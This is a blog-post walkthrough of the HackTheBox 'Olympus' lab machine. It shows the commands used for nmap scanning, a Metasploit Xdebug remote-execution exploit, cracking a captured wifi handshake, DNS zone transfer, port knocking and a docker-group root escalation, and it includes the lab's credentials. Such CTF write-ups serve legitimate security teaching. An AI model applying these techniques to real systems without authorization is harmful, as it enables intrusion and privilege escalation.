---
layout: post
title: HackTheBox Olympus Writeup [eng]
author: 0xSaiyajin
tags: [writeup,ctf]
categories: [writeup]
---

Hello again. 
In this content, i will explain how to gain most privileged user on Olympus Machine. 
Last time, i wrote about *Poison* machine. It was the easiest machine on HTB to solve.
Now, we are going to solve the most enjoyable machine on HTB.

On this machine, these lessons can be learned:
+ Understanding usage of *dns enumeration* tools, dns records.
+ Dialectic of Docker containers.
+ How do you understand that you are in container.

```
Target: 10.10.10.83 [Olympus]
System: Linux
```

Writing a writeup is harder than solving vulnerable machine if you have solved it already.
Because, you just know how to *hack* that machine. You need to think like you have never solved that challenge and you should write like this.

Because of this reason, i will erase all my findings about this machine and i'm going to start with basic steps.

If you read my first blog post, i said you need to enumerate the system well.

**Enumeration is the most valuable tool of pentester.**

If you don't know your scope for testing, you need to discover hosts on your network with tools like **arp**, netdiscover (etc).
But we know our target scope. So, we can skip this part.

Let's start with nmap. 

```nmap 10.10.10.83 -sC -sV -p-```

We are using Script Scan on all ports. You need to scan all ports. 
For example; if you miss an open port with vulnerable service, you can't go any further. Thats why we are trying to detect all open ports.

![nmap-scan]({{site.url}}/assets/images/olympus/nmap.png)

Here open ports: 22(?filtered),53(domain),80(http),2222(ssh)

Before attacking to these ports, just stop and think possible scenarios for initial foothold:

+ SSH Bruteforce and gaining user access.
+ Finding sensitive files, gaining shell on vulnerable page or webservice on http port.
+ Zone transfer or data exfiltration from domain.(DNS records).

When you connect to http port via browser, you will see an image.

![crete]({{site.url}}/assets/images/olympus/crete.png)

If you try to analyze response headers you will see an interesting header there.(Xdebug: 2.5.5)

```curl -i -X GET 10.10.10.83```
```
HTTP/1.1 200 OK
Date: Tue, 25 Sep 2018 15:02:55 GMT
Server: Apache
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-XSS-Protection: 1; mode=block
Xdebug: 2.5.5
Content-Length: 314
Content-Type: text/html; charset=UTF-8
...
```

All you need to do is searching Xdebug 2.5.5 on google. After that you will see Xdebug Command Execution exploit module for metasploit.

![googleit]({{site.url}}/assets/images/olympus/xdebugsearch.png)

Using exploit:
```use exploit/unix/http/xdebug_unauth_exec```

![msf]({{site.url}}/assets/images/olympus/msfoptions.png)

![msfshell]({{site.url}}/assets/images/olympus/msfshell.png)

Shell gained.

![container]({{site.url}}/assets/images/olympus/incontainer.png)

After trying some enumerations, we can predict that we are in **container.**

How do i understand it: 
+ Hostname looks like docker container name.
+ There are no parent system processes(init etc.)
+ There are no built in programming languages(ruby,python).
+ Reading /proc/[process_id]/cgroup file.

```cat /proc/1/cgroup```
```
10:blkio:/docker/f00ba96171c58d55c6bf1a2e6796dca8c36e565d7aacfcc3bcd593c9214edcf9
9:freezer:/docker/f00ba96171c58d55c6bf1a2e6796dca8c36e565d7aacfcc3bcd593c9214edcf9
8:cpu,cpuacct:/docker/f00ba96171c58d55c6bf1a2e6796dca8c36e565d7aacfcc3bcd593c9214edcf9
7:cpuset:/docker/f00ba96171c58d55c6bf1a2e6796dca8c36e565d7aacfcc3bcd593c9214edcf9
6:devices:/docker/f00ba96171c58d55c6bf1a2e6796dca8c36e565d7aacfcc3bcd593c9214edcf9
5:net_cls,net_prio:/docker/f00ba96171c58d55c6bf1a2e6796dca8c36e565d7aacfcc3bcd593c9214edcf9
4:pids:/docker/f00ba96171c58d55c6bf1a2e6796dca8c36e565d7aacfcc3bcd593c9214edcf9
3:memory:/docker/f00ba96171c58d55c6bf1a2e6796dca8c36e565d7aacfcc3bcd593c9214edcf9
2:perf_event:/docker/f00ba96171c58d55c6bf1a2e6796dca8c36e565d7aacfcc3bcd593c9214edcf9
1:name=systemd:/docker/f00ba96171c58d55c6bf1a2e6796dca8c36e565d7aacfcc3bcd593c9214edcf9
```

As you can see, we are exactly in docker container. So, we need to escape from this container.
I searched a method for escaping it but i couldn't even find one. We need enumerate more. 

When i tried to check for user.txt on home directory, i couldn't find user.txt but i found interesting directory.

![airgeddon]({{site.url}}/assets/images/olympus/airgeddon.png)

Someone(creator of this machine) downloaded airgeddon tool on this machine.
I googled this tool and found that airgeddon is a tool for wireless packet capturing. 
Also, i'm trying to find different directories on github repository and current directory. 

The difference between them is **captured** directory.

![captured]({{site.url}}/assets/images/olympus/captured.png)

There are two interesting files. After reading content of txt file, only one left.
Let's analyze that .cap file with Wireshark. Probably, there are credentials in that file. 
But the real problem is, we need to crack that file.

Anyway, trying to analyze it...

![essid]({{site.url}}/assets/images/olympus/capessid.png)

Interesting ESSID. Looks like part of credential.(Password maybe)

```SSID: Too_cl0se_to_th3_Sun```

I cracked that file on my first solve. I used **john** + **rockyou.txt** for cracking it. It took nearly an hour.
Decrypted text was : ```flight_of_icarus``` or something like this.

If you read /etc/passwd file you will see that one of the username was **zeus**.

So, icarus could be user too. Also, if you search "Too close to the Sun" on google, you will see the wiki page of Icarus.

Credentials acquired.
```
user: icarus
password: Too_cl0se_to_th3_Sun
```

We have the key, also we know where the door at. **Port 2222(ssh)**
Before acquiring these credentials, i tried countless bruteforce to the ssh.

Zeus banned us from Mount Crete, we are trying to return that place and reach to the top of Mount Crete.

```ssh icarus@10.10.10.83 -p 2222```

![icarus]({{site.url}}/assets/images/olympus/icarus.png)

Well, we flew up to another container. Home directory contains a file with name "help_of_the_gods.txt"

Output of that file:
```
Athena goddess will guide you through the dark...

Way to Rhodes...
ctfolympus.htb
```

We actually learned domain name of this machine.
We have to check another domain names.

```host -l ctfolympus.htb 10.10.10.83```

Gives that output:
```
Using domain server:
Name: 10.10.10.83
Address: 10.10.10.83#53
Aliases: 

ctfolympus.htb has address 192.168.0.120
ctfolympus.htb name server ns1.ctfolympus.htb.
ctfolympus.htb name server ns2.ctfolympus.htb.
mail.ctfolympus.htb has address 192.168.0.120
ns1.ctfolympus.htb has address 192.168.0.120
ns2.ctfolympus.htb has address 192.168.0.120
```

Maybe we should try dns zone transfer.

```dig axfr ctfolympus.htb @10.10.10.83```

![zone transfer]({{site.url}}/assets/images/olympus/zone.png)

What does the output says?
+ Here lies the great Colossus of Rhodes
+ prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!

That's it! We got second credentials.

```
user: prometheus
password: St34l_th3_F1re!
```

We can finally reach to the user.txt.
```ssh prometheus@10.10.10.83 -p 2222```

```
prometheus@10.10.10.83's password: 
Permission denied, please try again.
```
Wrong credentials?! What could be wrong?
After trying some bruteforces, i finally realized that there were port numbers on zone transfer records.

```open a temporal portal to Hades (3456 8234 62431)```

So, we have to open that portal to Hades first. Also, i realized that on Nmap report port 22 shown as filtered.
If somehow we open that filtered port to open, we can successfully connect it.

After doing some google searches, i discovered that **Port Knocking** is magic word.

> Open Sesame!

I used *knock* tool for current step. Knock tool tries to knock given port numbers with combinational order. 
In this way, it bypasses specific **iptables** rule.

For example; when you trying to connect port 22 with ssh, it won't return answer. (It will drop packets.)
But, if you try to knock these ports when you are connecting to port 22, you can access to it.

```knock 10.10.10.83 3456 8234 62431 && ssh prometheus@10.10.10.83```

![hades]({{site.url}}/assets/images/olympus/hades.png)

Finally got user.txt ! Now, we are focusing to root.txt.

```cat msg_of_gods.txt```

```
Only if you serve well to the gods, you'll be able to enter into the
      _                           
 ___ | | _ _ ._ _ _  ___  _ _  ___
/ . \| || | || ' ' || . \| | |<_-<
\___/|_|`_. ||_|_|_||  _/`___|/__/
        <___'       |_|           
```

Also, we are not in docker container anymore. Yipe! 
After getting user.txt, we should focus to Privilege Escalation techniques.
I just google'd Docker Privilege Escalation and found a blog post about it.

```
https://fosterelli.co/privilege-escalation-via-docker.html
```

I read that post and saw that sentence.
> If you happen to have gotten access to a user-account on a machine, and that user is a member of the ‘docker’ group, running the following command will give you a root shell.

Let's check that groups of user **prometheus**

```
id
uid=1000(prometheus) gid=1000(prometheus) groups=1000(prometheus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth),999(docker)
```

User prometheus is in group of *docker*.

Time to get root.txt:

```docker run -v /:/root -i -t test/gotroot```
```
Unable to find image 'test/gotroot:latest' locally
docker: Error response from daemon: Get https://registry-1.docker.io/v2/: dial tcp: lookup registry-1.docker.io on [::1]:53: dial udp [::1]:53: connect: cannot assign requested address.
See 'docker run --help'.
```

Frankly we need to set real docker image as parameter. 
I'm checking images on docker: ```docker images```

![images]({{site.url}}/assets/images/olympus/images.png)

Final touches, editing docker command as: ```docker run -v /:/gotroot -i -t olympia /bin/bash```

This command creates a volume named "gotroot" in shell mode and executes **bash** with given image.

![gotroot]({{site.url}}/assets/images/olympus/gotroot.png)


> We banished from Mount Crete, we flew, we opened portal to Hades then we finally returned to top of the Mount Crete.

```
Got r00t!
```
